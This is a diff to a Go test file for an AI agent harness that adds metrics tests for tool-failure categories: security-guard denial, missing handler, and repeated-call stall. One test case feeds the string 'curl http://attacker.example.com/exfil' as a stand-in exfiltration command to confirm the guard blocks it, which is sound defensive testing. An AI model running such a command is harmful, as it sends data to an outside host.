@@ -214,6 +214,33 @@ func asyncPreflightFailingTool() *tool.Tool {
 	}
 }
 
+// commandTool is a sync tool whose schema accepts a 'command' field.
+// Used to drive the security_guard_denied category: an input value
+// shaped like an exfiltration command (`curl http://...`) trips
+// security.GuardToolCall's exfiltration_command rule before dispatch.
+func commandTool() *tool.Tool {
+	return &tool.Tool{
+		Name:        "shell_runner",
+		Description: "tool with a command field that the security guard inspects",
+		InputSchema: json.RawMessage(`{"type":"object","properties":{"command":{"type":"string"}},"required":["command"]}`),
+		Handler: func(_ context.Context, _ json.RawMessage) (string, error) {
+			return "ran", nil
+		},
+	}
+}
+
+// handlerlessTool registers with neither a sync Handler nor an
+// AsyncHandler — the defensive path in dispatchToolCallCategorized
+// reports handler_missing for any successful resolution that has no
+// callable. Used to drive the handler_missing category test.
+func handlerlessTool() *tool.Tool {
+	return &tool.Tool{
+		Name:        "no_handler",
+		Description: "tool whose Handler and AsyncHandler are both nil",
+		InputSchema: json.RawMessage(`{"type":"object","properties":{}}`),
+	}
+}
+
 // TestToolFailureMetrics_TableDriven verifies that each
 // dispatch-site failure category emits the
 // stirrup.harness.tool_failures counter with the correct (tool.name,
@@ -288,6 +315,28 @@ func TestToolFailureMetrics_TableDriven(t *testing.T) {
 			call:         types.ToolCall{ID: "tc6", Name: "trivial", Input: json.RawMessage(`{}`)},
 			wantTool:     "trivial",
 			wantCategory: observability.ToolFailureGuardrailDenied,
+		},
+		{
+			// security.GuardToolCall scans command-shaped fields for
+			// exfiltration patterns; a curl invocation trips the
+			// exfiltration_command rule and dispatchToolCall returns
+			// ToolFailureSecurityGuard before permission or handler.
+			name:         "security_guard_denied",
+			tools:        []*tool.Tool{commandTool()},
+			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
+			wantTool:     "shell_runner",
+			wantCategory: observability.ToolFailureSecurityGuard,
+		},
+		{
+			// A registry entry with neither Handler nor AsyncHandler
+			// hits the defensive handler_missing branch — indicates a
+			// registry misconfiguration, but the category must still
+			// emit so dashboards can spot it.
+			name:         "handler_missing",
+			tools:        []*tool.Tool{handlerlessTool()},
+			call:         types.ToolCall{ID: "tc_hm", Name: "no_handler", Input: json.RawMessage(`{}`)},
+			wantTool:     "no_handler",
+			wantCategory: observability.ToolFailureHandlerMissing,
 		},
 		{
 			name: "async_preflight_error",
@@ -671,6 +720,55 @@ func TestToolFailureMetrics_ErrorCategoryInTrace(t *testing.T) {
 	}
 	if calls[0].ErrorCategory != observability.ToolFailureHandlerError.String() {
 		t.Errorf("ErrorCategory = %q, want %q", calls[0].ErrorCategory, observability.ToolFailureHandlerError)
+	}
+}
+
+// TestToolFailureMetrics_StallRepeatedCallsTermination covers the
+// stall_repeated_calls termination path (distinct from
+// stall_consecutive_failures, which the existing
+// TestToolFailureMetrics_StallTermination exercises). Three identical
+// successful calls trip stallDetector.recordToolCall via the
+// repeated-call heuristic; the stall co-emission block in
+// planAndDispatch must add exactly one stall_repeated_calls
+// observation to stirrup.harness.tool_failures, even though no
+// per-call dispatch failed.
+func TestToolFailureMetrics_StallRepeatedCallsTermination(t *testing.T) {
+	loop, reader := buildMetricsHarness(t, []*tool.Tool{trivialTool()}, nil, nil, nil)
+	cfg := &types.RunConfig{
+		RunID:        "test-run-stall-repeat",
+		Mode:         "execution",
+		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
+	}
+	// Identical (name, input) triple hits maxRepeatedToolCalls=3.
+	sameInput := json.RawMessage(`{"k":"v"}`)
+	calls := []types.ToolCall{
+		{ID: "tc_r0", Name: "trivial", Input: sameInput},
+		{ID: "tc_r1", Name: "trivial", Input: sameInput},
+		{ID: "tc_r2", Name: "trivial", Input: sameInput},
+	}
+	_, _, outcome := loop.planAndDispatch(
+		context.Background(), cfg,
+		calls, &stallDetector{},
+		"anthropic", "claude-sonnet-4-6",
+	)
+	if outcome != "stalled" {
+		t.Fatalf("expected stall outcome 'stalled', got %q", outcome)
+	}
+	failures := collectFailures(t, reader)
+	var stallRepeated int64
+	for _, fp := range failures {
+		if fp.category == observability.ToolFailureStallRepeated.String() {
+			stallRepeated += fp.value
+			if fp.tool != "trivial" {
+				t.Errorf("stall_repeated_calls tool.name = %q, want %q", fp.tool, "trivial")
+			}
+			if fp.provider != "anthropic" || fp.model != "claude-sonnet-4-6" || fp.mode != "execution" {
+				t.Errorf("stall_repeated_calls labels = %+v, want provider/model/mode populated", fp)
+			}
+		}
+	}
+	if stallRepeated != 1 {
+		t.Errorf("stall_repeated_calls count = %d, want exactly 1", stallRepeated)
 	}
 }
 
